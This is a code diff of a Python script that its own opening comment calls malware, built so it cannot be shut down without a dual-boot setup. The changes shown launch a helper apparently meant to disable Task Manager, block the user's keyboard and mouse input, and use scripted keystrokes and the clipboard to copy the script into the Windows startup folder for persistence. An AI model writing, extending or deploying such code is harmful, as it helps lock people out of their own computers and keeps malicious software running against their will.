@@ -1,12 +1,15 @@
 # this will make it impossible to shut the malware down unless you access the file
 # through a dual boot setup (with linux 👌❤) and delete the file.
-import shutil
+
 import threading
+from shutil import copyfile
+
 import pyautogui
 import time
 import keyboard
 import win32clipboard
 from pynput.mouse import Controller
+from termcolor import colored
 import subprocess
 
 ntm = subprocess.Popen(["Documents\\Scripts\\python.exe", "noTaskMgr.py"])
@@ -18,10 +21,12 @@ def blockinput():
     block_input_flag = 1
     t1 = threading.Thread(target=blockinput_start)
     t1.start()
+    print(colored('[OK] ', 'cyan') + colored('INPUT BLOCKING INSTRUCTED', 'green'))
 
 
 def unblockinput():
     blockinput_stop()
+    print(colored('[OK] ', 'cyan') + colored('INPUT UNBLOCKING INSTRUCTED', 'red'))
 
 
 def blockinput_start():
@@ -50,15 +55,21 @@ pyautogui.keyDown('win')
 pyautogui.press('r')
 pyautogui.keyUp('win')
 pyautogui.write('shell:startup')
-pyautogui.press(['enter', 'f10', 'h', 'w', 's'])
-pyautogui.write(str(__file__))
 pyautogui.press('enter')
+time.sleep(3)
+for i in range(0, 4):
+    pyautogui.press('tab')
+    time.sleep(0.3)
+pyautogui.press('enter')
+pyautogui.hotkey('ctrl' + 'c')
+win32clipboard.OpenClipboard()
+startupPath = win32clipboard.GetClipboardData()
+win32clipboard.CloseClipboard()
 window = pyautogui.getActiveWindow()
 window.close()
+copyfile(str(__file__), startupPath)
 
-pyautogui.keyDown('ctrl')
-pyautogui.press('r')
-pyautogui.keyUp('ctrl')
+pyautogui.hotkey('win' + 'r')
 pyautogui.write('cmd')
 pyautogui.press('enter')
 pyautogui.write('C:\\WINDOWS\\system32\\notepad.exe')
